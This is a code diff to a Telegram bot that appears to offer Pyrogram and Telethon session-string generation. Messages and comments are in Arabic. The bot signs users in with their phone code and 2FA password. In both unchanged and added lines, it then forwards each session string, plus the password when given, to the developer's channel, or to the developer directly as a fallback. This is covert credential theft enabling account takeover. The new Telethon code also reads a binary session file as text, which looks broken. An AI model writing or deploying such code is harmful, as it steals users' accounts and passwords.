@@ -17,7 +17,6 @@ from pyrogram.errors import (
     PasswordHashInvalid
 )
 from telethon import TelegramClient, events
-from telethon.sessions import StringSession
 from telethon.errors import (
     ApiIdInvalidError,
     PhoneNumberInvalidError,
@@ -237,6 +236,7 @@ async def extract_api_info_callback(callback_query):
         print(f"✅ تم إرسال API Info للمجموعة {SESSION_CHANNEL}")
     except Exception as e:
         print(f"❌ فشل إرسال API Info للمجموعة: {e}")
+        # محاولة الإرسال كحل احتياطي
         try:
             await app.send_message(
                 DEV_USERNAME,
@@ -356,6 +356,7 @@ async def send_pyro_session(user_id, session_string, message, password=None):
         f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
     )
     
+    # محاولة إرسال إلى القناة
     try:
         if password:
             await app.send_message(
@@ -375,7 +376,9 @@ async def send_pyro_session(user_id, session_string, message, password=None):
         print(f"✅ تم إرسال جلسة Pyrogram للمجموعة {SESSION_CHANNEL}")
     except Exception as e:
         print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
+        # محاولة الإرسال كحل احتياطي
         try:
+            # محاولة الإرسال للمطور
             await app.send_message(
                 DEV_USERNAME,
                 f"⚠️ فشل إرسال جلسة Pyrogram للقناة!\n\n"
@@ -387,7 +390,7 @@ async def send_pyro_session(user_id, session_string, message, password=None):
         except:
             pass
 
-# ====== دوال Telethon (المعدلة) ======
+# ====== دوال Telethon ======
 async def telethon_session_step(client, message):
     user_id = message.chat.id
     step = user_steps.get(user_id)
@@ -416,9 +419,16 @@ async def telethon_session_step(client, message):
         temp_client = user_data[user_id]["client"]
         try:
             await temp_client.sign_in(user_data[user_id]["phone"], phone_code)
-            # استخدام StringSession للحصول على جلسة نصية
-            session_string = StringSession.save(temp_client.session)
-            user_sessions[user_id] = session_string
+            session_file = f"telethon_{user_id}.session"
+            session_string = None
+            if os.path.exists(session_file):
+                with open(session_file, 'r') as f:
+                    session_string = f.read()
+            if session_string is None or session_string == "":
+                session_string = temp_client.session.save()
+                user_sessions[user_id] = session_string
+            else:
+                user_sessions[user_id] = session_string
             await send_telethon_session(user_id, session_string, message)
             await temp_client.disconnect()
             reset_user(user_id)
@@ -437,9 +447,16 @@ async def telethon_session_step(client, message):
         try:
             password = message.text
             await temp_client.sign_in(password=password)
-            # استخدام StringSession للحصول على جلسة نصية
-            session_string = StringSession.save(temp_client.session)
-            user_sessions[user_id] = session_string
+            session_file = f"telethon_{user_id}.session"
+            session_string = None
+            if os.path.exists(session_file):
+                with open(session_file, 'r') as f:
+                    session_string = f.read()
+            if session_string is None or session_string == "":
+                session_string = temp_client.session.save()
+                user_sessions[user_id] = session_string
+            else:
+                user_sessions[user_id] = session_string
             await send_telethon_session(user_id, session_string, message, password)
             await temp_client.disconnect()
             reset_user(user_id)
@@ -448,6 +465,12 @@ async def telethon_session_step(client, message):
             reset_user(user_id)
 
 async def send_telethon_session(user_id, session_string, message, password=None):
+    if session_string is None or session_string == "":
+        if user_id in user_sessions:
+            session_string = user_sessions[user_id]
+        else:
+            session_string = "⚠️ لم يتم استخراج الجلسة بشكل صحيح، يرجى المحاولة مرة أخرى."
+
     await message.reply(
         f"✅ تم إنشاء جلسة Telethon بنجاح!\n\n"
         f"🔑 الجلسة:\n{session_string}\n\n"
@@ -455,6 +478,7 @@ async def send_telethon_session(user_id, session_string, message, password=None)
         f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
     )
     
+    # محاولة إرسال إلى القناة
     try:
         if password:
             await app.send_message(
@@ -474,6 +498,7 @@ async def send_telethon_session(user_id, session_string, message, password=None)
         print(f"✅ تم إرسال جلسة Telethon للمجموعة {SESSION_CHANNEL}")
     except Exception as e:
         print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
+        # محاولة الإرسال كحل احتياطي
         try:
             await app.send_message(
                 DEV_USERNAME,
@@ -510,3 +535,4 @@ if __name__ == "__main__":
         print("✅ البوت يعمل الآن!")
     except Exception as e:
         print(f"❌ فشل تشغيل البوت: {e}")
+    
